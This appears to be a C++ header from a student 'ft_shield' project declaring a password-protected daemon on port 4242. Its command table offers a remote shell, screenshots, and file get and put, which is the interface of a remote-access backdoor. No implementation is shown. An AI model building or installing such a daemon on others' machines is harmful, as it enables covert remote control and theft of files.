#pragma once

#include <ctime>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <poll.h>
#include <string>

#if MATT_MODE
#include "Tintin_reporter.hpp"
#define MLOG(x) logger.info(x) 
#define MERR(x) logger.error(x)
#else // !MATT_MODE
#define MLOG(x)
#define MERR(x)
#endif // !MATT_MODE

#define MATT_LOGFILE "matt_daemon"
#if SHIELD_DEBUG
#define MATT_LOGFILE_DIR "/tmp/matt_daemon"
#else // !SHIELD_DEBUG
#define MATT_LOGFILE_DIR "/var/log/matt_daemon"
#endif // !SHIELD_DEBUG

#define FT_SHIELD_MAX_CLIENTS 3

#ifndef FT_SHIELD_PORT
# define FT_SHIELD_PORT 4242
#endif // !FT_SHIELD_PORT
#ifndef FT_SHIELD_PORT_STRING
# define FT_SHIELD_PORT_STRING "4242"
#endif // !FT_SHIELD_PORT_STRING

#define FT_SHIELD_SHELL "/bin/sh" 
#define FT_SHIELD_TIMEOUT 60		// time in Seconds before a client gets dropped (from idling in auth) range before being dropped is [0..FT_SHIELD_TIMEOUT]
#define FT_SHIELD_MESSAGE_SIZE 4096

enum class ClientState
{
	UNUSED,			// Client slot is unused
	CONNECTED,		// Initial state, awaiting authentication
	AUTHENTICATED,  // Authenticated, awaiting command
	DISCONNECTED,	// Client has been set to be disconnected
};

typedef struct
{
	int index;
	struct pollfd* pollfd;
	ClientState	state;
	time_t last_seen;
	std::string input_buffer;		// what the client sends to the server
	std::string output_buffer;		// what the server sends to the client
}	Client;

#include <shield/commands.hpp>

static const Command COMMANDS[] =
{
	{"shell", "shell", "Closes the connection temporairly and launches a shell", shield_cmd_shell},
	{"help", "help [command]", "Provides help about the command list or a particular command", shield_cmd_help},
	{"screenshot", "screenshot", "If a graphical session is running, takes a screenshot", shield_cmd_screenshot},
	{"get", "get <path>", "Downloads a file from the server", shield_cmd_get},
	{"put", "put <path>", "Uploads a file to the server", shield_cmd_put},
	{NULL, NULL, NULL, NULL}
};

class DaemonServer
{
	private:
		struct pollfd pollfd_array[FT_SHIELD_MAX_CLIENTS + 1];	// 1 extra slot is for the server listening socket
		Client client_list[FT_SHIELD_MAX_CLIENTS];
		bool should_accept;										// bool indicating if server should accept clients 
		int current_conn;										// number of currently connected clients
		char password_hash[32];

		void accept_new_client();

		// all client related functions have 2 versions for convenience, by index or by address	

		void clear_client(Client *client);				// will not do anything if client is NULL
		void clear_client(size_t client_index);			// will not do anything if client_index out of [0..FT_SHIELD_MAX_CLIENTS)

		void disconnect_client(Client *client);
		void disconnect_client(size_t client_index);

		bool receive_message(Client *client);
		bool receive_message(size_t client_index);

		void send_message(Client *client);
		void send_message(size_t client_index);

		void check_activity(Client *client);
		void check_activity(size_t client_index);

#if MATT_MODE
		Tintin_reporter logger;
#endif

	public:
		DaemonServer(char password_hash[32]);
		~DaemonServer();
		int init();
		void run();
};
